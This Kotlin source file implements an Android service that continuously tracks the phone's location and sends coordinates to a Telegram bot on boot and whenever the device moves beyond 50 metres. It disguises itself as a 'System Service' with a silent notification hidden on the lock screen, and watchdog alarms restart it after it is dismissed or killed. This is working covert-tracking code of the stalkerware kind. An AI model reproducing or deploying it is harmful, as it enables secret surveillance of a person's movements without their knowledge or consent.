package com.gpstracker.telegram

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class LocationTrackingService : Service() {

    companion object {
        private const val TAG = "LocationSvc"
        private const val CHANNEL_ID = "sys_svc_01"
        private const val NOTIFICATION_ID = 1

        const val EXTRA_BOOT_START = "boot_start"

        private const val ALERT_DISTANCE_METERS      = 50f
        private const val TELEGRAM_INTERVAL_MS       = 5 * 60 * 1000L
        private const val LOCATION_INTERVAL_MS       = 30_000L
        private const val LOCATION_FASTEST_MS        = 15_000L
        private const val WATCHDOG_ALARM_INTERVAL_MS = 10 * 60 * 1000L   // 10 min
    }

    private lateinit var fusedClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private var startLocation: Location? = null
    private var isBootStart = false
    private var bootLocationSent = false

    // ─── Lifecycle ────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        fusedClient = LocationServices.getFusedLocationProviderClient(this)
        createNotificationChannel()
        buildLocationCallback()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, buildStealthNotification())

        isBootStart = intent?.getBooleanExtra(EXTRA_BOOT_START, false) ?: false

        val prefs = prefs()
        prefs.edit().putBoolean(Prefs.KEY_TRACKING_ACTIVE, true).apply()

        bootLocationSent = prefs.getBoolean(Prefs.KEY_BOOT_LOCATION_SENT, !isBootStart)

        // Restore a previously-locked start location (survives service restarts)
        val savedLat = prefs.getFloat(Prefs.KEY_START_LAT, Float.MIN_VALUE)
        val savedLng = prefs.getFloat(Prefs.KEY_START_LNG, Float.MIN_VALUE)
        if (savedLat != Float.MIN_VALUE && startLocation == null) {
            startLocation = Location("saved").apply {
                latitude  = savedLat.toDouble()
                longitude = savedLng.toDouble()
            }
        }

        scheduleWatchdogs()
        startLocationUpdates()

        Log.d(TAG, "Service started (bootStart=$isBootStart)")
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // App was swiped away — schedule an immediate alarm to restart
        Log.d(TAG, "Task removed — scheduling restart alarm")
        scheduleImmediateRestart()
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        Log.d(TAG, "onDestroy — will be restarted by watchdog")
        fusedClient.removeLocationUpdates(locationCallback)
        scope.cancel()
        scheduleImmediateRestart()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─── Location ─────────────────────────────────────────────────────────────

    private fun buildLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { onNewLocation(it) }
            }
        }
    }

    @Suppress("MissingPermission")
    private fun startLocationUpdates() {
        val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, LOCATION_INTERVAL_MS)
            .setMinUpdateIntervalMillis(LOCATION_FASTEST_MS)
            .build()
        fusedClient.requestLocationUpdates(req, locationCallback, Looper.getMainLooper())
    }

    private fun onNewLocation(location: Location) {
        // Persist latest fix
        prefs().edit()
            .putFloat(Prefs.KEY_CURRENT_LAT, location.latitude.toFloat())
            .putFloat(Prefs.KEY_CURRENT_LNG, location.longitude.toFloat())
            .apply()

        // First fix — send "phone online + location" message if this was a boot start
        if (!bootLocationSent) {
            bootLocationSent = true
            prefs().edit().putBoolean(Prefs.KEY_BOOT_LOCATION_SENT, true).apply()
            val (token, chatId) = credentials()
            if (token.isNotBlank() && chatId.isNotBlank()) {
                scope.launch {
                    TelegramApi.sendMessage(
                        token, chatId,
                        TelegramApi.buildOnlineWithLocationMessage(
                            location.latitude, location.longitude, location.accuracy
                        )
                    )
                }
            }
        }

        // Lock starting point on very first fix of this session
        if (startLocation == null) {
            startLocation = location
            prefs().edit()
                .putFloat(Prefs.KEY_START_LAT, location.latitude.toFloat())
                .putFloat(Prefs.KEY_START_LNG, location.longitude.toFloat())
                .apply()
            Log.d(TAG, "Start location locked: ${location.latitude}, ${location.longitude}")
            return
        }

        val distance = startLocation!!.distanceTo(location)
        prefs().edit().putFloat(Prefs.KEY_CURRENT_DIST, distance).apply()

        // Send periodic alert when beyond threshold
        if (distance >= ALERT_DISTANCE_METERS) {
            val p = prefs()
            val lastSent = p.getLong(Prefs.KEY_LAST_SENT_TIME, 0L)
            val now = System.currentTimeMillis()
            if (now - lastSent >= TELEGRAM_INTERVAL_MS) {
                val (token, chatId) = credentials()
                if (token.isNotBlank() && chatId.isNotBlank()) {
                    scope.launch {
                        val sent = TelegramApi.sendMessage(
                            token, chatId,
                            TelegramApi.buildLocationMessage(
                                location.latitude, location.longitude, distance, location.accuracy
                            )
                        )
                        if (sent) prefs().edit().putLong(Prefs.KEY_LAST_SENT_TIME, now).apply()
                    }
                }
            }
        }
    }

    // ─── Watchdogs ────────────────────────────────────────────────────────────

    private fun scheduleWatchdogs() {
        // 1. WorkManager — survives across reboots
        val workReq = PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "loc_watchdog",
            ExistingPeriodicWorkPolicy.KEEP,
            workReq
        )

        // 2. AlarmManager — fires every 10 minutes while device is awake
        scheduleWatchdogAlarm(WATCHDOG_ALARM_INTERVAL_MS)
    }

    private fun scheduleImmediateRestart() {
        scheduleWatchdogAlarm(5_000L)   // 5 seconds
    }

    private fun scheduleWatchdogAlarm(delayMs: Long) {
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, WatchdogReceiver::class.java).apply {
            action = WatchdogReceiver.ACTION_WATCHDOG
        }
        val pi = PendingIntent.getBroadcast(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        try {
            am.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + delayMs,
                pi
            )
        } catch (e: SecurityException) {
            // Exact alarms require SCHEDULE_EXACT_ALARM on Android 12+; fall back to inexact
            am.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + delayMs,
                pi
            )
        }
    }

    // ─── Stealth notification ─────────────────────────────────────────────────

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "System Services",
            NotificationManager.IMPORTANCE_MIN          // lowest — no status-bar icon
        ).apply {
            description = ""
            setShowBadge(false)
            setSound(null, null)
            enableLights(false)
            enableVibration(false)
        }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(channel)
    }

    private fun buildStealthNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)   // hidden on lock screen
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    // ─── Helpers ──────────────────────────────────────────────────────────────

    private fun prefs() = getSharedPreferences(Prefs.NAME, Context.MODE_PRIVATE)

    private fun credentials(): Pair<String, String> {
        val p = prefs()
        val token  = p.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN) ?: Prefs.DEFAULT_BOT_TOKEN
        val chatId = p.getString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)   ?: Prefs.DEFAULT_CHAT_ID
        return token to chatId
    }
}
